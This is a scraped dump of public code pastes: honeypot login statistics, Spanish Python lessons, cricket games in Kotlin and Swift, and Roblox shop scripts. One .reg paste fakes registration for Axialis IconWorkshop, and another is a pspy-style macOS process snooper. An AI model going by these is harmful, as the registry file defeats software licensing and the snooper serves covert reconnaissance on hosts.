    ""YUH Application Software Company Limited"": 1,
    ""Rethem Hosting LLC"": 1,
    ""Contabo GmbH"": 1,
    ""Contabo Asia Private LTD"": 2,
    ""VietServer Services technology company limited"": 2,
    ""Palo Alto Networks, Inc"": 6,
    ""IP Volume inc"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""IT Resheniya LLC"": 1,
    ""Microsoft Azure Cloud (southcentralus)"": 1,
    ""Microsoft Azure Cloud (centralus)"": 1,
    ""Google Cloud (europe-west1)"": 1,
    ""Vermos Company Limited"": 2,
    ""Vietnam Internet Network Information Center"": 1
  },
  ""regionName"": {
    ""Ohio"": 44,
    ""Virginia"": 112,
    ""Gansu"": 42,
    ""Xinjiang Uyghur Autonomous Region"": 30,
    ""Quebec"": 8,
    ""Sofia-Capital"": 31,
    ""Zhejiang"": 33,
    ""England"": 4,
    ""Tehran"": 30,
    ""Jiangsu"": 27,
    ""Sao Paulo"": 31,
    ""Guangxi"": 1,
    ""Michigan"": 1,
    ""Beijing"": 9,
    ""North Holland"": 13,
    ""Moscow"": 22,
    ""Vilnius"": 4,
    ""Kyiv City"": 8,
    ""New York"": 9,
    ""South West"": 2,
    ""Karnataka"": 10,
    ""Mazovia"": 4,
    ""Kaunas"": 4,
    ""Lombardy"": 2,
    ""New Jersey"": 1,
    ""Jeollabuk-do"": 1,
    ""Tokyo"": 10,
    ""North West"": 31,
    ""Bogota D.C."": 2,
    ""Hanoi"": 5,
    ""Illinois"": 1,
    ""Bavaria"": 1,
    ""North East"": 2,
    ""California"": 6,
    ""Ho Chi Minh"": 3,
    ""St.-Petersburg"": 1,
    ""Texas"": 1,
    ""Iowa"": 1,
    ""Brussels Capital"": 1
  },
  ""country"": {
    ""United States"": 176,
    ""China"": 142,
    ""Canada"": 8,
    ""Bulgaria"": 31,
    ""United Kingdom"": 4,
    ""Iran"": 30,
    ""Brazil"": 31,
    ""Netherlands"": 13,
    ""Russia"": 23,
    ""Lithuania"": 8,
    ""Ukraine"": 8,
    ""Singapore"": 35,
    ""India"": 10,
    ""Poland"": 4,
    ""Italy"": 2,
    ""South Korea"": 1,
    ""Japan"": 10,
    ""Colombia"": 2,
    ""Vietnam"": 8,
    ""Germany"": 1,
    ""Belgium"": 1
  },
  ""account"": {
    ""142.93.8.59"": 384,
    ""hello"": 97,
    ""Test"": 14,
    ""(empty)"": 3,
    ""Administr"": 19,
    ""Domain"": 23,
    ""nmap"": 1,
    ""UZnaZRkKA"": 1,
    ""rCpLaM"": 1,
    ""ObPcLI"": 1,
    ""root"": 1,
    ""tyCpYZblJ"": 1,
    ""nlTtfI"": 1,
    ""adYRzf"": 1
  },
  ""keyboard"": {
    ""Unknown"": 548
  },
  ""client_build"": {
    ""Unknown"": 548
  },
  ""client_name"": {
    ""Unknown"": 548
  },
  ""ip_type"": {
    ""Unknown"": 366,
    ""hosting & proxy"": 10,
    ""hosting"": 142,
    ""mobile"": 19,
    ""proxy"": 11
  }
}"
wEe58f2c,excepciones y raise,teslariu,Python,Thursday 29th of June 2023 07:07:01 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
""""""
Python 3.10.5 (tags/v3.10.5:f377153, Jun  6 2022, 16:14:13) [MSC v.1929 64 bit (AMD64)] on win32
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> # excepciones: son un modelo de manejo de errores
>>> 25/0
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
ZeroDivisionError: division by zero
>>> 25 + ""er""
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: unsupported operand type(s) for +: 'int' and 'str'
>>> int(""er"")
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
ValueError: invalid literal for int() with base 10: 'er'
>>> lista = [1,2]
>>> lista[2]
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
IndexError: list index out of range
>>> dicc = {""red"":""rojo"", ""blue"":""azul""}
>>> dicc[""yellow""]
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
KeyError: 'yellow'
>>>

# Script que pide dos numeros y devuelve su cociente

a = float(input(""Dividendo: ""))
b = float(input(""Divisor: ""))

try:
    print(f""{a}/{b} = {a/b}"")
except ZeroDivisionError:
    print(""No se puede dividir por cero"")
else:
    print(""Que suerte, no hubo errores"")
finally:
    print(""Adios"") # esto se ejecuta siempre

try:
    n = 2 / int(""0"")
except ValueError:
    print(""Error de valor: debe ingresar un numero"")
except ZeroDivisionError:
    print(""Error de division por cero"")
else:
    print(n)

# otro enfoque
try:
    n = 2 / int(""sdfdsf"")
except (ValueError, ZeroDivisionError):
    print(""Error de valor o de division por cero"")
else:
    print(n)
""""""

def sumar(a,b):
    """"""Función que recibe como argumentos dos numeros y devuelve su suma""""""
    if not isinstance(a,(int,float)) or not isinstance(b,(int,float)):
        raise TypeError(""Se requieren dos números"")
    return a + b
    
    
print(sumar(1,2))
print(sumar(""Ale"",""jandro""))
print(sumar([1,2,3],[""hola"",""chau""]))"
BLqAfnZd,AIW692,cigcag,REG,Thursday 29th of June 2023 06:49:45 PM CDT,"Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\IcoFile\DefaultIcon]
""PictureIndex""=""4""

; OPTIONAL
[HKEY_CURRENT_USER\Software\Axialis\Customer Info]
""UserEmail""=""johndoe@nsaneforums.com""

[HKEY_CURRENT_USER\Software\Axialis\IconWorkshop\registration]
""DontRemindRegistration""=dword:00000001
""ProductKey""=""00000000-00000-00000-00000-00000""
""RegistrationDone""=dword:00000001
""UserFirstname""=""John""
""UserLastname""=""Doe"""
f1PPQ7GH,map filter lambda y zip,teslariu,Python,Thursday 29th of June 2023 06:27:16 PM CDT,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Funciones de orden superior: map, filter
# 1) funcion lambda o inline o anónima
""""""
def sumar(x,y):
    return x + y
    
suma = lambda x,y: x + y

total = sumar(1,2)
print(total)

total2 = suma(100,200)
print(total2)

# funcion map: itera sobre un iterable y le aplica una función a cada
# uno de sus elementos
# map(funcion, iterable)

# a) map() sin lambda
# script que busca las palabras que empiezan con ""a"" dentro de una lista
lista = [""ala"", ""barco"", ""pena"", ""alamo"", ""condor"", ""abeliano""]

def empieza_con_A(palabra):
    if palabra.startswith(""a""):
        return palabra

mapeo = map(empieza_con_A,lista)
print(list(mapeo))

# b) map() con lambda
lista = [""ala"", ""barco"", ""pena"", ""alamo"", ""condor"", ""abeliano""]
mapeo = map(lambda s: s if s.startswith(""a"") else False,lista)
print(list(mapeo))



## filter: similar a map, pero solamente devuelve los items que
# cumplen la condicion (True)

# el mismo ejemplo anterior
lista = [""ala"", ""barco"", ""pena"", ""alamo"", ""condor"", ""abeliano""]
filtrado = filter(lambda s: s.startswith(""a""),lista)
print(list(filtrado))
""""""

# Otra función integrada ""normal"" (no es de orden superior): zip()
paises = [""Francia"", ""Argentina"", ""Italia""]
capitales = [""Paris"", ""BsAs"", ""Roma""]

# script que imprime una tabla de paises y su capital
for pais,capital in zip(paises, capitales):
    print(pais, capital, sep="" -*- "")










"
GbvckqNt,Untitled,hamoudiiiiiiiii,Python,Thursday 29th of June 2023 06:03:29 PM CDT,"import os
import asyncio
import time
import discord
import json
from pyzbar.pyzbar import decode
from PIL import Image
import requests
from io import BytesIO
import redis
from dateutil.parser import parse
from datetime import datetime, timezone
import hashlib
import hmac
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')
SECRET = os.getenv('SECRET')

client = discord.Client(intents=discord.Intents.all())
redis_client = redis.Redis(host='localhost', port=6379, db=0)

MOD_ROLE_NAME = ""Team""

# Role IDs
role_to_remove_id = 1110912292729651261
role_to_add_id = 1123406597490737152

# Invite code
invite_code = ""NmNCVGGv""

# Your existing code goes here...

@client.event
async def on_member_join(member):
    for guild in client.guilds:
        invites = await guild.invites()
        for invite in invites:
            if invite.code == invite_code:
                role_to_remove = discord.utils.get(member.guild.roles, id=role_to_remove_id)
                role_to_add = discord.utils.get(member.guild.roles, id=role_to_add_id)
                await member.remove_roles(role_to_remove)
                await member.add_roles(role_to_add)
                break

client.run(TOKEN)
"
fXDKsHaB,Untitled,Skos_Martren,C++,Thursday 29th of June 2023 05:22:21 PM CDT,"struct PairHash {
	size_t operator()(const pair<int, int> p) const { // передавать pair<int, int> по ссылке или нет?

		return (size_t)(h_i_1(p.first) * 37 * 37 + h_i_1(p.second) * 37 + 117);
	}
	hash<int> h_i_1;
	hash<int> h_i_2;
};

// можно ли из двумерной координаы получить уникальный id?
bool CheckCoordinate(const vector<vector<int>>& points, unordered_map<pair<int, int>, bool, PairHash>& PointToExist, const int cnt/* = x_min + x_max*/) {
	for (auto point : points) {

		if (!PointToExist[{cnt - point[0], point[1]}]) { return false; }
	}
	return true;
}

/*
Если расположить PairHash ниже CheckCoordinate, то в MSVS будет ошибка: Error (active)	E0308	more than one instance of overloaded function ""CheckCoordinate"" matches the argument list:	
*/

bool isReflected(const vector<vector<int>>& points) {

	int x_min = points.front().front();
	int x_max = points.back().front();
	unordered_map<pair<int, int>, bool, PairHash> PointToExist; // необходимо для реализации CheckCoordinate

	for (const auto& point : points) {

		const int x = point[0];
		const int y = point[1];
		x_min = min(x_min, x);
		x_max = max(x_max, x);
		if (!PointToExist[{x, y}]) { PointToExist[{x, y}] = 1; }

	}
	
	return CheckCoordinate(points, PointToExist, x_min + x_max);
}"
gtHQAaJh,Car Cricket Kotlin,tomdodd4598,Kotlin,Thursday 29th of June 2023 05:04:12 PM CDT,"package dodd

import java.util.stream.IntStream
import kotlin.math.absoluteValue

typealias Ball = Pair<Int, Boolean>

fun mod(x: Int, y: Int) = (x % y + y) % y

fun String.hash() = fold(5381) { acc, x -> 127 * (acc and 0x00FFFFFF) + x.code }

fun String.filtered(): IntStream = codePoints().filter{ it !in 0xFE00..0xFE0F }

class Team(coach: String, val name: String, players: List<String>) {

    val coachUpper = coach.uppercase()
    val nameUpper = name.uppercase()

    val players = mutableListOf<String>()
    private val playersLast = mutableListOf<String>()

    private val bowl = mutableListOf<Int>()
    private val wk = mutableListOf<Int>()

    private val uuid = (coach + name).hash()

    init {
        for (i in 0 until 11) {
            val player = players[i]
            var suffix = """"
            if (player.length >= 4) {
                suffix = player.substring(0, player.length - 4).lowercase()
            }
            if (suffix == ""(wk)"" || suffix == ""[wk]"" || suffix == ""{wk}"") {
                this.wk.add(i)
            }
            else if (i - wk.size > 5) {
                this.bowl.add(i)
            }
            this.players.add(player)
            this.playersLast.add(player.split(""\\s+"").last())
        }
    }

    fun bowler(count: Int): String {
        val test = (count / 6) * this.uuid
        if (test % 8 == 0) {
            val index = mod(test, 11)
            if (!this.wk.contains(index)) {
                return this.playersLast[index]
            }
        }
        return this.playersLast[this.bowl[mod(test, this.bowl.size)]]
    }
}

fun main() {
    fun parseTeam(): Team {
        val coach = readln()
        val name = readln()
        readln()
        val players = (0 until 11).map { readln() }
        readln()
        return Team(coach, name, players)
    }

    fun runsStr(runs: Int) = if (runs == 0) ""🦆"" else runs.toString()

    val teams = arrayOf(parseTeam(), parseTeam())
    val teamRuns = arrayOf(0, 0)

    val toss = readln().toInt() - 1
    var batting: Int
    val line = readln().lowercase()
    batting = if (line == ""bat"" || line == ""batting"") toss else 1 - toss
    readln()

    fun bowling() = 1 - batting

    var count = 6 * 123456789

    var batterRuns = 0
    var batterBalls = 0
    var totalRuns = 0
    var totalWickets = 0
    var wicket: Boolean
    var innings = 1
    var target = 0

    fun runPl(runs: Int) = if (runs == 1) ""$runs RUN"" else ""$runs RUNS""

    fun wicketPl(wickets: Int) = if (wickets == 1) ""$wickets WICKET"" else ""$wickets WICKETS""

    fun batter() = teams[batting].players[totalWickets]

    fun bowler() = teams[bowling()].bowler(count)

    fun printBatter(out: Boolean) {
        if (out) {
            println(""${batter()} ${runsStr(batterRuns)} (${bowler()})"")
        }
        else {
            println(""${batter()} $batterRuns n/o"")
        }
    }

    fun printCurrentInnings() {
        printBatter(false)
        for (i in 1 + totalWickets until 11) {
            println(teams[batting].players[i])
        }
        println(""\n$totalRuns/$totalWickets\n"")
    }

    val ballDict = mutableMapOf<Int, Ball>()

    fun putBall(value: Ball, str: String) {
        for (code in str.filtered()) {
            ballDict[code] = value
        }
    }

    val gone = Ball(0, true)
    val dot = Ball(0, false)
    val one = Ball(1, false)
    val two = Ball(2, false)
    val three = Ball(3, false)
    val four = Ball(4, false)
    val five = Ball(5, false)
    val six = Ball(6, false)

    putBall(gone, ""!❤️🔴🟥"")
    putBall(dot, ""0🖤⚫️⬛️⚫⬛"")
    putBall(one, ""1🤍⚪️⬜️⚪⬜"")
    putBall(two, ""2💚🟢🟩"")
    putBall(three, ""3🧡🟠🟧"")
    putBall(four, ""4💙🔵🟦"")
    putBall(five, ""5💜🟣🟪"")
    putBall(six, ""6💛🟡🟨"")

    fun otherBall() = five

    fun carBall(code: Int) = ballDict.getOrDefault(code, otherBall())

    val cars = readln()

    println(""${teams[0].coachUpper} VS ${teams[1].coachUpper} TEST\n"")

    println(""${teams[0].nameUpper}\nvs\n${teams[1].nameUpper}\n"")

    val decision = if (toss == batting) ""bat"" else ""bowl""
    println(""${teams[toss].name} won the toss and chose to $decision\n"")

    println(""1ST INNINGS\n"")

    for (car in cars.filtered()) {
        count += 1
        val (r, w) = carBall(car)
        batterRuns += r
        batterBalls += 1
        totalRuns += r
        teamRuns[batting] += r
        wicket = w
        if (wicket) {
            printBatter(true)
            batterRuns = 0
            batterBalls = 0
            totalWickets += 1
            if (totalWickets > 10) {
                println(""\n$totalRuns/$totalWickets\n"")
                batting = bowling()
                totalRuns = 0
                totalWickets = 0
                innings += 1
                if (innings == 3) {
                    val lead = teamRuns[0] - teamRuns[1]
                    if (lead == 0) {
                        println(""SCORES LEVEL"")
                    }
                    else {
                        val leading = if (lead > 0) 0 else 1
                        println(""${teams[leading].nameUpper} LEAD BY ${runPl(lead.absoluteValue)}\n"")
                    }
                    println(""2ND INNINGS\n"")
                }
                else if (innings == 4) {
                    val deficit = teamRuns[bowling()] - teamRuns[batting]
                    if (deficit < 0) {
                        println(""${teams[batting].nameUpper} WIN BY AN INNINGS AND ${runPl(-deficit)}"")
                        return
                    }
                    else {
                        target = 1 + deficit
                        println(""${teams[batting].nameUpper} NEED ${runPl(target)} TO WIN\n"")
                    }
                }
                else if (innings > 4) {
                    val lead = teamRuns[batting] - teamRuns[bowling()]
                    if (lead == 0) {
                        println(""MATCH TIED\n"")
                    }
                    else {
                        println(""${teams[batting].nameUpper} WIN BY ${runPl(lead)}\n"")
                    }
                    return
                }
            }
        }
        else if (innings == 4 && totalRuns >= target) {
            printCurrentInnings()
            println(""${teams[batting].nameUpper} WIN BY ${wicketPl(11 - totalWickets)}"")
            return
        }
    }

    printCurrentInnings()

    val lead = teamRuns[batting] - teamRuns[bowling()]
    if (innings == 4) {
        println(""${teams[batting].nameUpper} NEED ${runPl(1 - lead)} TO WIN"")
    }
    else {
        if (lead == 0) {
            println(""SCORES LEVEL"")
        }
        else {
            val leading = if (lead > 0) batting else bowling()
            println(""${teams[leading].nameUpper} LEAD BY ${runPl(lead.absoluteValue)}"")
        }
    }
}
"
KbXwdBvM,Car Cricket Swift,tomdodd4598,Swift,Thursday 29th of June 2023 05:03:41 PM CDT,"import Foundation

func mod(_ x: Int, _ y: Int) -> Int {
	return (x % y + y) % y
}

func strHash(_ str: String) -> Int {
	return [UInt8](str.utf8).reduce(5381) {
		127 &* (Int($0) & 0x00FFFFFF) + Int($1)
	}
}

class Team {
	
	let coach: String
	let coachUpper: String
	let name: String
	let nameUpper: String
	var players: [String]
	var playersLast: [String]
	var bowl: [Int]
	var wk: [Int]
	var uuid: Int
	
	init(_ coach: String, _ name: String, _ players: [String]) {
		self.coach = coach
		self.coachUpper = coach.uppercased()
		self.name = name
		self.nameUpper = name.uppercased()
		self.players = []
		self.playersLast = []
		self.bowl = []
		self.wk = []
		self.uuid = strHash(coach + name)
		for i in 0..<11 {
			let player = players[i]
			var suffix = """"
			if player.count >= 4 {
				suffix = player[player.index(player.startIndex, offsetBy: player.count - 4)...].lowercased()
			}
			if suffix == ""(wk)"" || suffix == ""[wk]"" || suffix == ""{wk}"" {
				self.wk.append(i)
			}
			else if i - wk.count > 5 {
				self.bowl.append(i)
			}
			self.players.append(player)
			self.playersLast.append(player.components(separatedBy: "" "").last!)
		}
	}
	
	func bowler(_ count: Int) -> String {
		let test = (count / 6) &* self.uuid
		if test % 8 == 0 {
			let index = mod(test, 11)
			if !self.wk.contains(index) {
				return self.playersLast[index]
			}
		}
		return self.playersLast[self.bowl[mod(test, self.bowl.count)]]
	}
}

func parseTeam() -> Team {
	let coach = readLine()!
	let name = readLine()!
	_ = readLine()
	var players = [String]()
	for _ in 0..<11 {
		players.append(readLine()!)
	}
	_ = readLine()
	return Team(coach, name, players)
}

func runsStr(_ runs: Int) -> String {
	if runs == 0 {
		return ""🦆""
	}
	else {
		return String(runs)
	}
}

var teams = [parseTeam(), parseTeam()]
var teamRuns = [0, 0]

var toss = Int(readLine()!)! - 1
var batting = 0
let line = readLine()!.lowercased()
batting = line == ""bat"" || line == ""batting"" ? toss : 1 - toss
_ = readLine()

func bowling() -> Int {
	return 1 - batting
}

var count = 6 * 123456789

var batterRuns = 0
var batterBalls = 0
var totalRuns = 0
var totalWickets = 0
var wicket = false
var innings = 1
var target = 0

func runPl(_ runs: Int) -> String {
	if runs == 1 {
		return ""\(runs) RUN""
	}
	else {
		return ""\(runs) RUNS""
	}
}

func wicketPl(_ wickets: Int) -> String {
	if wickets == 1 {
		return ""\(wickets) WICKET""
	}
	else {
		return ""\(wickets) WICKETS""
	}
}

func batter() -> String {
	return teams[batting].players[totalWickets]
}

func bowler() -> String {
	return teams[bowling()].bowler(count)
}

func printBatter(_ out: Bool) {
	if out {
		print(""\(batter()) \(runsStr(batterRuns)) (\(bowler()))"")
	}
	else {
		print(""\(batter()) \(batterRuns) n/o"")
	}
}

func printCurrentInnings() {
	printBatter(false)
	for i in (totalWickets + 1)..<11 {
		print(""\(teams[batting].players[i])"")
	}
	print(""\n\(totalRuns)/\(totalWickets)\n"")
}

var ballDict = [Character: (Int, Bool)]()

func putBall(_ value: (Int, Bool), _ chars: String) {
	for c in Array(chars) {
		ballDict[c] = value
	}
}

let out = (0, true)
let dot = (0, false)
let one = (1, false)
let two = (2, false)
let three = (3, false)
let four = (4, false)
let five = (5, false)
let six = (6, false)

putBall(out, ""!❤️🔴🟥"")
putBall(dot, ""0🖤⚫️⬛️⚫⬛"")
putBall(one, ""1🤍⚪️⬜️⚪⬜"")
putBall(two, ""2💚🟢🟩"")
putBall(three, ""3🧡🟠🟧"")
putBall(four, ""4💙🔵🟦"")
putBall(five, ""5💜🟣🟪"")
putBall(six, ""6💛🟡🟨"")

func otherBall() -> (Int, Bool) {
	return five
}

func carBall(_ str: Character) -> (Int, Bool) {
	if let b = ballDict[str] {
		return b
	}
	return otherBall()
}

let cars = Array(readLine()!)

print(""\(teams[0].coachUpper) VS \(teams[1].coachUpper) TEST\n"")

print(""\(teams[0].nameUpper)\nvs\n\(teams[1].nameUpper)\n"")

let decision = toss == batting ? ""bat"" : ""bowl""
print(""\(teams[toss].name) won the toss and chose to \(decision)\n"")

print(""1ST INNINGS\n"")

for car in cars {
	count &+= 1
	wicket = false
	let (r, w) = carBall(car)
	batterRuns += r
	batterBalls += 1
	totalRuns += r
	teamRuns[batting] += r
	wicket = w
	if wicket {
		printBatter(true)
		batterRuns = 0
		batterBalls = 0
		totalWickets += 1
		if totalWickets > 10 {
			print(""\n\(totalRuns)/\(totalWickets)\n"")
			batting = bowling()
			totalRuns = 0
			totalWickets = 0
			innings += 1
			if innings == 3 {
				let lead = teamRuns[0] - teamRuns[1]
				if lead == 0 {
					print(""SCORES LEVEL"")
				}
				else {
					let leading = lead > 0 ? 0 : 1
					print(""\(teams[leading].nameUpper) LEAD BY \(runPl(abs(lead)))\n"")
				}
				print(""2ND INNINGS\n"")
			}
			else if innings == 4 {
				let deficit = teamRuns[bowling()] - teamRuns[batting]
				if deficit < 0 {
					print(""\(teams[batting].nameUpper) WIN BY AN INNINGS AND \(runPl(-deficit))"")
					exit(0)
				}
				else {
					target = 1 + deficit
					print(""\(teams[batting].nameUpper) NEED \(runPl(target)) TO WIN\n"")
				}
			}
			else if innings > 4 {
				let lead = teamRuns[batting] - teamRuns[bowling()]
				if lead == 0 {
					print(""MATCH TIED\n"")
				}
				else {
					print(""\(teams[batting].nameUpper) WIN BY \(runPl(lead))\n"")
				}
				exit(0)
			}
		}
	}
	else if innings == 4 && totalRuns >= target {
		printCurrentInnings()
		print(""\(teams[batting].nameUpper) WIN BY \(wicketPl(11 - totalWickets))"")
		exit(0)
	}
}

printCurrentInnings()

let lead = teamRuns[batting] - teamRuns[bowling()]
if innings == 4 {
	print(""\(teams[batting].nameUpper) NEED \(runPl(1 - lead)) TO WIN"")
}
else {
	if lead == 0 {
		print(""SCORES LEVEL"")
	}
	else {
		let leading = lead > 0 ? batting : bowling()
		print(""\(teams[leading].nameUpper) LEAD BY \(runPl(abs(lead)))"")
	}
}
"
gE8tYCuH,Salas de cinema,LightProgrammer000,Python,Thursday 29th of June 2023 05:03:34 PM CDT,"""""""
# Programa: Salas de Cinema
""""""

# Sala 1: 10 lugares
# Sala 2: 2 lugares
# Sala 3: 1 lugares
# Sala 4: 3 lugares
# Sala 5: 0 lugares

# Variaveis lista
lugares_vagos = [10, 2, 1, 3, 0]

# Repeticao: Percorrendp lista
while True:

    # Repeticao: Status das Salas
    print(f""\n{'=-=' * 10} Salas {'=-=' * 10}"")
    for i, j in enumerate(lugares_vagos):
        print(f""# Sala: {i + 1} | Lugares vazios: {j}"")

    # Entrada de dados: Sala atuando aqui como indice
    sala = int(input(""\n# Digite numero da Sala [1 - 5] ('0' encerrar programa): ""))

    # Decisao: Sair do programa
    if sala == 0:
        break

    # Protecao: Salas entre 1 e 5
    if len(lugares_vagos) >= sala > 0:

        # Decisao: Valor dentro da lista
        if lugares_vagos[sala - 1] > 0:
            print(f""# Lugares livres na sala {sala}: {lugares_vagos[sala - 1]}"")

            # Entrada de dados: Quantidade de lugares a ser debatido da quantidade na posicao da lista
            qtd_lugares = int(input(""* Quantos lugares deseja comprar: ""))

            # Protecao: Valores negativos
            if 0 < qtd_lugares <= lugares_vagos[sala - 1]:

                # Calculo
                lugares_vagos[sala - 1] -= qtd_lugares

            else:
                print(""! Valor incompativel"")

        # Decisao: Mensagem para as salas lotadas
        elif lugares_vagos[sala - 1] == 0:
            print(f""-> Sala {sala} | Lotada"")

        else:
            print(""Lugares esgotados"")

    else:
        print(""Sala invalida"")
"
1ru778mR,like pspy working for MAC OS,Mr_hEx,Python,Thursday 29th of June 2023 04:59:44 PM CDT,"import subprocess
import time
import os

def get_process_info():
    process_list = []
    ps_output = subprocess.run(['ps', 'ax', '-o', 'pid,user,command'], capture_output=True, text=True)
    lines = ps_output.stdout.splitlines()[1:] 

    for line in lines:
        fields = line.strip().split(maxsplit=2)
        pid, user, command = fields
        process_list.append({
            'pid': int(pid),
            'user': user,
            'command': command
        })

    return process_list

def main():
    old_processes = set()
    while True:
        current_processes = get_process_info()
        current_pids = {proc['pid'] for proc in current_processes}
        new_pids = current_pids - old_processes

        if new_pids:
            for proc in current_processes:
                if proc['pid'] in new_pids and not proc['command'].startswith('ps'):
                    print(""New Process: PID: {} | User: {} | Command: {} "".format(proc['pid'], proc['user'], proc['command']))

        old_processes = current_pids
        time.sleep(0.001)

if __name__ == ""__main__"":
    main()"
QqeezP4x,Courses.vue,funtique,JavaScript,Thursday 29th of June 2023 04:57:29 PM CDT,"<script>
export default {
  data: () => ({
    courses: [
      {
        name: 'Attack faster',
        programs: [],
        excerpt: 'Better attack is always great',
        learningOutcomes: [],
        contentAndChapters: [
          'Improve footwork for quicker approach.',
          'Anticipate the set to start your approach early.',
          'Focus on quick arm swing and timing.',
        ],
        tools: [],
        prerequisities: []
      },
      {
        name: 'Jump higher',
        programs: [],
        excerpt: 'Getting closer to the ball',
        learningOutcomes: [],
        contentAndChapters: [
          'Strengthen legs with exercises like squats and lunges.',
          'Incorporate plyometric exercises for explosive power.',
          'Develop core and upper body strength for stability and control.',
        ],
        tools: [],
        prerequisities: []
      },
      {
        name: 'Gym for volley',
        programs: [],
        excerpt: 'Be stronger !',
        learningOutcomes: [],
        contentAndChapters: [
          'Strength training: Lift weights to build overall strength and power.',
          'Plyometric exercises: Incorporate explosive movements like jumps and hops.',
          'Core and stability work: Focus on strengthening your core for better balance and control.',
        ],
        tools: [],
        prerequisities: []
      },
      {
        name: 'Cardio for the win',
        programs: [],
        excerpt: 'No more tireness',
        learningOutcomes: [],
        contentAndChapters: [
          'Try high-intensity interval training (HIIT) for quick and intense cardio bursts.',
          'Engage in continuous aerobic exercises like running, swimming, or cycling.',
          'Incorporate circuit training for a combination of cardiovascular and strength exercises.',
        ],
        tools: [],
        prerequisities: []
      }
    ],
   })
}
</script>

<template>

  <div class=""text-h4 my-4 mt-4""  align=""center"">How to perform better</div>
  <v-divider class=""my-2""></v-divider>
  <v-expansion-panels variant=""popout"" class=""pa-4"">
    <v-expansion-panel v-for=""(course, i) in courses"" :key=""i"" hide-actions>
      <v-expansion-panel-title>
        <v-row align=""center"" class=""spacer"" no-gutters>
          <v-col class=""hidden-xs-only text-left ms-2"" sm=""5"" md=""3"">
            <strong v-html=""course.name""></strong>
          </v-col>

          <v-col
            v-if=""course.excerpt""
            class=""text-medium-emphasis text-truncate hidden-sm-and-down""
          >
            &mdash;
            {{ course.excerpt }}
          </v-col>
        </v-row>
      </v-expansion-panel-title>

      <v-expansion-panel-text>
        <v-card-text>
          <v-item-group v-if=""course.contentAndChapters.length"">
            <div class=""text-caption mb-2""><strong>How to do ?</strong></div>
            <v-item v-for=""(chapter, i) in course.contentAndChapters"" :key=""tool"">
              <div>{{ `${i+1}) ` }}  {{ chapter }}</div>
            </v-item>
          </v-item-group>
          <v-divider class=""my-2""></v-divider>

          <v-item-group v-if=""course.tools.length"">
            <div class=""text-caption mb-2"">Tools</div>
            <v-item v-for=""tool in course.tools"" :key=""tool"">
              <v-chip color=""indigo-darken-4""> {{ tool }} </v-chip>
            </v-item>
          </v-item-group>
        </v-card-text>
      </v-expansion-panel-text>
    </v-expansion-panel>
  </v-expansion-panels>
</template>
"
XqnW2rrr,ProductHandler Module Script,KashTheKingYT,Lua,Thursday 29th of June 2023 04:35:59 PM CDT,"local module = {}

module[1568919903] = function(player)
	player.leaderstats.Coins.Value += 1000
end

module[1568935987] = function(player)
	player.leaderstats.Coins.Value += 3000
end

return module"
E9SqckH7,Coins Leaderstats Script,KashTheKingYT,Lua,Thursday 29th of June 2023 04:35:38 PM CDT,"local players = game:GetService(""Players"")
function playerAdded(player)
	local leaderstats = Instance.new(""Folder"")
	local coins = Instance.new(""IntValue"")
	coins.Name = ""Coins""
	leaderstats.Name = ""leaderstats""
	
	coins.Parent = leaderstats
	leaderstats.Parent = player
end

players.PlayerAdded:Connect(playerAdded)"
mCngxucP,Products Script,KashTheKingYT,Lua,Thursday 29th of June 2023 04:35:20 PM CDT,"local marketplaceService = game:GetService(""MarketplaceService"")
local replicatedStorage = game:GetService(""ReplicatedStorage"")
local remote = replicatedStorage:WaitForChild(""PurchaseProduct"")

local productHandler = require(replicatedStorage.ProductHandler)

remote.OnServerEvent:Connect(function(player,assetId)
	marketplaceService:PromptProductPurchase(player,assetId)
end)

marketplaceService.ProcessReceipt = function(receiptInfo)
	local userId = receiptInfo.PlayerId
	local product = receiptInfo.ProductId
	
	local player = game.Players:GetPlayerByUserId(userId)
	
	if player then
		productHandler[product](player)
		return Enum.ProductPurchaseDecision.PurchaseGranted
	end
	
	return Enum.ProductPurchaseDecision.NotProcessedYet
end"
gV0jb7tQ,ShopControl Script,KashTheKingYT,Lua,Thursday 29th of June 2023 04:35:02 PM CDT,"local shopFrame = script.Parent
local gui = shopFrame.Parent
local button = gui.ShopButton
local itemList = shopFrame:WaitForChild(""ItemList"")
local preset = itemList:WaitForChild(""Preset"")

local marketplaceService = game:GetService(""MarketplaceService"")
local replicatedStorage = game:GetService(""ReplicatedStorage"")
local products = replicatedStorage:WaitForChild(""Products"")

local remote = replicatedStorage:WaitForChild(""PurchaseProduct"")

function purchase(assetId)
	remote:FireServer(assetId)
end

for i,product in products:GetChildren() do
	local info = marketplaceService:GetProductInfo(product.Value,Enum.InfoType.Product)
	
	if info then		
		local price = info.PriceInRobux
		local name = info.Name
		local isForSale = info.IsForSale
		local image = info.IconImageAssetId
		
		if isForSale then
			local newPreset = preset:Clone()
			newPreset.Visible = true
			newPreset.Product.Price.Text = ""R$""..price
			newPreset.Product.ItemName.Text = name
			newPreset.Product.Icon.Image = ""rbxassetid://""..image
			
			newPreset.Name = name
			newPreset.Parent = itemList
			
			newPreset.Product.Purchase.MouseButton1Down:Connect(function()
				purchase(product.Value)
			end)
		end
	end
end

button.MouseButton1Down:Connect(function()
	shopFrame.Visible = not shopFrame.Visible
end)"
3sZmLc5c,Untitled,pacho_the_python,Python,Thursday 29th of June 2023 04:12:12 PM CDT,"fuel_type = input()
fuel_liters = int(input())

if fuel_type == ""Diesel"":
    if fuel_liters >= 25:
        print(""You have enough diesel."")
    else:
        print(""Fill your tank with diesel!"")
elif fuel_type == ""Gasoline"":
    if fuel_liters >= 25:
        print(""You have enough gasoline."")
    else:
        print(""Fill your tank with gasoline!"")
elif fuel_type == ""Gas"":
    if fuel_liters >= 25:
        print(""You have enough gas."")
    else:
        print(""Fill your tank with gas!"")
else:
    print(""Invalid fuel!"")

"
